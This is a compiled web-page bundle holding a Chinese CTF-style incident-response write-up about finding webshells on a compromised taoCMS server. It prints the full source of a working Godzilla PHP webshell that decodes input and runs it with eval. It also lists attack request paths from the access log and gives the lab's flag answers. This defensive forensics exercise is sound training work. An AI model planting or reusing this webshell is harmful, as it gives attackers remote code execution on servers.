"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[2662],{38112:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>d,contentTitle:()=>s,default:()=>r,frontMatter:()=>l,metadata:()=>p,toc:()=>o});var i=a(74848),t=a(28453);const l={sidebar_position:1,tags:["Easy","\u5e94\u6025\u54cd\u5e94"],title:"\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94-webshell\u67e5\u6740",description:"\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94-webshell\u67e5\u6740",sidebar_label:"\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94-webshell\u67e5\u6740"},s="\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94-webshell\u67e5\u6740",p={id:"box/\u7384\u673a/1",title:"\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94-webshell\u67e5\u6740",description:"\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94-webshell\u67e5\u6740",source:"@site/docs/box/\u7384\u673a/1.md",sourceDirName:"box/\u7384\u673a",slug:"/box/\u7384\u673a/1",permalink:"/docs/box/\u7384\u673a/1",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"\u5e94\u6025\u54cd\u5e94",permalink:"/docs/tags/\u5e94\u6025\u54cd\u5e94"}],version:"current",sidebarPosition:1,frontMatter:{sidebar_position:1,tags:["Easy","\u5e94\u6025\u54cd\u5e94"],title:"\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94-webshell\u67e5\u6740",description:"\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94-webshell\u67e5\u6740",sidebar_label:"\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94-webshell\u67e5\u6740"},sidebar:"boxSidebar",previous:{title:"\u7384\u673a",permalink:"/docs/category/\u7384\u673a"}},d={},o=[{value:"\u9ed1\u5ba2webshell\u91cc\u9762\u7684flag",id:"\u9ed1\u5ba2webshell\u91cc\u9762\u7684flag",level:2},{value:"\u9ed1\u5ba2\u4f7f\u7528\u7684\u4ec0\u4e48\u5de5\u5177\u7684shell github\u5730\u5740\u7684md5",id:"\u9ed1\u5ba2\u4f7f\u7528\u7684\u4ec0\u4e48\u5de5\u5177\u7684shell-github\u5730\u5740\u7684md5",level:2},{value:"\u9ed1\u5ba2\u9690\u85cfshell\u7684\u5b8c\u6574\u8def\u5f84",id:"\u9ed1\u5ba2\u9690\u85cfshell\u7684\u5b8c\u6574\u8def\u5f84",level:2},{value:"\u9ed1\u5ba2\u514d\u6740\u9a6c\u5b8c\u6574\u8def\u5f84",id:"\u9ed1\u5ba2\u514d\u6740\u9a6c\u5b8c\u6574\u8def\u5f84",level:2}];function c(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",img:"img",p:"p",pre:"pre",...(0,t.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.h1,{id:"\u7b2c\u4e00\u7ae0-\u5e94\u6025\u54cd\u5e94-webshell\u67e5\u6740",children:"\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94-webshell\u67e5\u6740"}),"\n",(0,i.jsx)(n.p,{children:"\u538b\u7f29\u7f51\u7ad9\u6587\u4ef6\u5939\u5e76\u4e0b\u8f7d\u5230\u672c\u5730, \u968f\u540e\u4f7f\u7528 D\u76fe\u67e5\u6740\u5de5\u5177\u8fdb\u884c\u67e5\u6740"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240529122940.png",alt:"20240529122940"})}),"\n",(0,i.jsx)(n.h2,{id:"\u9ed1\u5ba2webshell\u91cc\u9762\u7684flag",children:"\u9ed1\u5ba2webshell\u91cc\u9762\u7684flag"}),"\n",(0,i.jsxs)(n.p,{children:["\u67e5\u770b ",(0,i.jsx)(n.code,{children:"/var/www/html/include/gz.php"})," \u6587\u4ef6\u4e2d\u5185\u5bb9"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:'root@ip-10-0-10-1:/var/www/html/include# cat gz.php\n<?php\n@session_start();\n@set_time_limit(0);\n@error_reporting(0);\nfunction encode($D,$K){\n    for($i=0;$i<strlen($D);$i++) {\n        $c = $K[$i+1&15];\n        $D[$i] = $D[$i]^$c;\n    }\n    return $D;\n}\n//027ccd04-5065-48b6-a32d-77c704a5e26d\n$payloadName=\'payload\';\n$key=\'3c6e0b8a9c15224a\';\n$data=file_get_contents("php://input");\nif ($data!==false){\n    $data=encode($data,$key);\n    if (isset($_SESSION[$payloadName])){\n        $payload=encode($_SESSION[$payloadName],$key);\n        if (strpos($payload,"getBasicsInfo")===false){\n            $payload=encode($payload,$key);\n        }\n                eval($payload);\n        echo encode(@run($data),$key);\n    }else{\n        if (strpos($data,"getBasicsInfo")!==false){\n            $_SESSION[$payloadName]=encode($data,$key);\n        }\n    }\n}\n'})}),"\n",(0,i.jsx)(n.admonition,{type:"info",children:(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-txt",children:"flag{027ccd04-5065-48b6-a32d-77c704a5e26d}\n"})})}),"\n",(0,i.jsx)(n.h2,{id:"\u9ed1\u5ba2\u4f7f\u7528\u7684\u4ec0\u4e48\u5de5\u5177\u7684shell-github\u5730\u5740\u7684md5",children:"\u9ed1\u5ba2\u4f7f\u7528\u7684\u4ec0\u4e48\u5de5\u5177\u7684shell github\u5730\u5740\u7684md5"}),"\n",(0,i.jsxs)(n.p,{children:["\u5bf9 ",(0,i.jsx)(n.code,{children:"/var/www/html/include/gz.php"})," \u8fdb\u884c\u5206\u6790\u5224\u65ad\u4e3a ",(0,i.jsx)(n.a,{href:"https://github.com/BeichenDream/Godzilla",children:"\u54e5\u65af\u62c9"}),"\u7684\u5de5\u5177"]}),"\n",(0,i.jsx)(n.admonition,{type:"info",children:(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-txt",children:"flag{39392de3218c333f794befef07ac9257}\n"})})}),"\n",(0,i.jsx)(n.h2,{id:"\u9ed1\u5ba2\u9690\u85cfshell\u7684\u5b8c\u6574\u8def\u5f84",children:"\u9ed1\u5ba2\u9690\u85cfshell\u7684\u5b8c\u6574\u8def\u5f84"}),"\n",(0,i.jsxs)(n.p,{children:["\u4f7f\u7528 D\u76fe \u67e5\u6740\u5de5\u5177\u67e5\u6740\u540e\u53ef\u4ee5\u53d1\u73b0\u6709\u4e00\u4e2a ",(0,i.jsx)(n.code,{children:"/var/www/html/include/Db/.Mysqli.php "})," \u8fd9\u4e2a\u5e94\u8be5\u5c31\u662f\u9690\u85cf\u7684 WebShell"]}),"\n",(0,i.jsx)(n.h2,{id:"\u9ed1\u5ba2\u514d\u6740\u9a6c\u5b8c\u6574\u8def\u5f84",children:"\u9ed1\u5ba2\u514d\u6740\u9a6c\u5b8c\u6574\u8def\u5f84"}),"\n",(0,i.jsxs)(n.p,{children:["\u5bf9\u65e5\u5fd7\u8fdb\u884c\u5206\u6790, \u7b5b\u9009\u7528\u6237\u7684\u8bf7\u6c42\u8def\u5f84 (\u5176\u5b9e\u5728\u4e0a\u9762\u7684\u67e5\u6740\u4e2d\u4e5f\u53ef\u4ee5\u770b\u51fa\u6765\u662f ",(0,i.jsx)(n.code,{children:"/var/www/html/wap/top.php"})," )"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"root@ip-10-0-10-1:/var/www/html/wap# awk '{print $7}' /var/log/apache2/access.log | sort | uniq -c\n      9 /\n      1 /1.php\n      1 /admin\n      1 /admin/\n      6 /admin/admin.php\n      1 /admin/admin.php?action=admin&ctrl=lists\n      2 /admin/admin.php?action=comment&ctrl=lists\n      1 /admin/admin.php?action=file&ctrl=edit&path=./shell.php\n      2 /admin/admin.php?action=file&ctrl=edit&path=shell.php\n      6 /admin/admin.php?action=file&ctrl=lists\n      1 /admin/admin.php?action=file&ctrl=lists&path=.\n      4 /admin/admin.php?action=frame&ctrl=iframes\n      1 /admin/admin.php?action=frame&ctrl=login\n      5 /admin/admin.php?action=frame&ctrl=main\n      4 /admin/admin.php?action=frame&ctrl=menu\n      4 /admin/admin.php?action=frame&ctrl=top\n      2 /admin/admin.php?action=link&ctrl=lists\n      3 /admin/admin.php?action=sql&ctrl=display\n      1 /admin/admin.php?path=&action=file&ctrl=create&isdir=0&name=&fbtn=%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6\n      1 /admin/admin.php?path=&action=file&ctrl=create&isdir=0&name=shell.php&fbtn=%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6\n      4 /adminer.php\n      1 /adminer.php?file=default.css&version=4.7.2\n      1 /adminer.php?file=favicon.ico&version=4.7.2\n      1 /adminer.php?file=functions.js&version=4.7.2\n      2 /adminer.php?file=jush.js&version=4.7.2\n      1 /adminer.php?script=version\n     10 /adminer.php?username=root\n      1 /adminer.php?username=root&db=mysql\n      1 /adminer.php?username=root&db=mysql&script=db\n      1 /admin/template/images/common.css\n      1 /admin/template/images/common.js\n      1 /admin/template/images/mainnavbg.gif\n      1 /admin/template/images/sub_arrow.gif\n      3 /admin/template/images/tinyeditor.js\n      3 /api.php?action=comment&ctrl=code\n      2 /?cat=1\n      1 /data/tplcache/top.php\n      2 /data/tplcache/top.php?1=phpinfo();\n      1 //favicon.ico\n      3 /favicon.ico\n      3 /?id=1\n     16 /install.php\n    107 /shell.php\n      1 /template/taoCMS/images/addthis.gif\n      1 /template/taoCMS/images/dot.gif\n      1 /template/taoCMS/images/logo.gif\n      1 /template/taoCMS/images/style.css\n      2 /template/taoCMS/images/tao.js\n      1 /template/taoCMS/images/tip.gif\n      4 /wap/index.php?1=phpinfo();\n      1 /wap/template/images/logo.gif\n      1 /wap/template/images/mobile.css\n      1 /wap/template/images/time.gif\n      2 /wap/top.php?1=phpinfo();\n      1 /wap/top.php?fuc=ERsDHgEUC1hI&func2=ser\n      1 /wap/top.php?fuc=ERsDHgEUC1hI&func2=sert\nroot@ip-10-0-10-1:/var/www/html/wap# \n"})}),"\n",(0,i.jsx)(n.admonition,{type:"info",children:(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-txt",children:"flag{eeff2eabfd9b7a6d26fc1a53d3f7d1de}\n"})})})]})}function r(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(c,{...e})}):c(e)}},28453:(e,n,a)=>{a.d(n,{R:()=>s,x:()=>p});var i=a(96540);const t={},l=i.createContext(t);function s(e){const n=i.useContext(l);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function p(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:s(e.components),i.createElement(l.Provider,{value:n},e.children)}}}]);